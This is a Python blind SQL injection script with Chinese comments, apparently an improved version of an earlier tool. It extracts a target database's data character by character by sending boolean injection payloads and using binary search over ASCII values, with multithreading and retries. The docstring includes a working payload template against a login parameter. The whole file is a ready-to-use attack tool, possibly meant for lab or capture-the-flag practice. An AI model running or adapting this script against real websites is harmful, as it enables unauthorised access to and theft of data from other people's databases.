# -*- coding: utf-8 -*-
"""盲注脚本（修复版）

用法和原版一样：长度 / url / 注入语句 / 命中关键字
区别：
  1. 每位用【二分查找】7 次请求搞定，不再从 0 数到 118；
  2. 复用 Session（keep-alive），不再每次新建 TCP 连接；
  3. 带 timeout + 重试，网络抖一下不会整个脚本崩掉；
  4. 线程数受控（默认 8），不会把本机端口和对方连接数打满。

注入语句模板里：
  {0} = 当前字符位置
  {1} = 比较阈值（脚本自动二分，你不用管）
示例：
  ?username=123'%20or%20ascii(substr(database(),{0},1))>{1}%23&password=1

⚠ `#` 必须写成 `%23`：requests/urllib3 会把 URL 里 `#` 之后的内容当成
   页面锚点直接丢掉，`&password=1` 就发不出去，页面底部那行结果就是空的。
"""

import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests.adapters import HTTPAdapter

MAX_WORKERS = 8
TIMEOUT = (5, 10)     # (连接, 读取) 秒
RETRIES = 3

_tls = threading.local()


def _session():
    """每个线程一个 Session，复用连接。"""
    s = getattr(_tls, "s", None)
    if s is None:
        s = requests.Session()
        s.headers.update({"User-Agent": "Mozilla/5.0"})
        adapter = HTTPAdapter(pool_connections=4, pool_maxsize=4, max_retries=0)
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        _tls.s = s
    return s


def _hit(url, find):
    """返回 find 是否出现在响应里；失败重试。"""
    last = None
    for attempt in range(RETRIES):
        try:
            r = _session().get(url, timeout=TIMEOUT)
            return find in r.text
        except requests.RequestException as e:
            last = e
            time.sleep(0.5 * (attempt + 1))
    raise last


def _one_char(base, template, find, pos):
    """二分出第 pos 个字符的 ASCII 码。"""
    lo, hi = 31, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if _hit(base + template.format(pos, mid), find):
            lo = mid + 1          # ascii > mid
        else:
            hi = mid
    return chr(lo) if 32 <= lo < 127 else ""


def main():
    n = int(input("输入查找长度: ").strip())
    url = input("输入url: ").strip()
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    template = input("输入注入语句({0}=位置, {1}=阈值): ").strip()
    find = input("需要查找的字符串: ").strip()

    chars = [""] * n
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
        futures = {pool.submit(_one_char, url, template, find, i + 1): i for i in range(n)}
        for fut in as_completed(futures):
            i = futures[fut]
            try:
                chars[i] = fut.result()
            except Exception as e:                       # noqa: BLE001
                print(f"[!] 第{i + 1}位失败: {e!r}", file=sys.stderr)
            print("".join(chars), flush=True)

    print("\n结果: " + "".join(chars))


if __name__ == "__main__":
    main()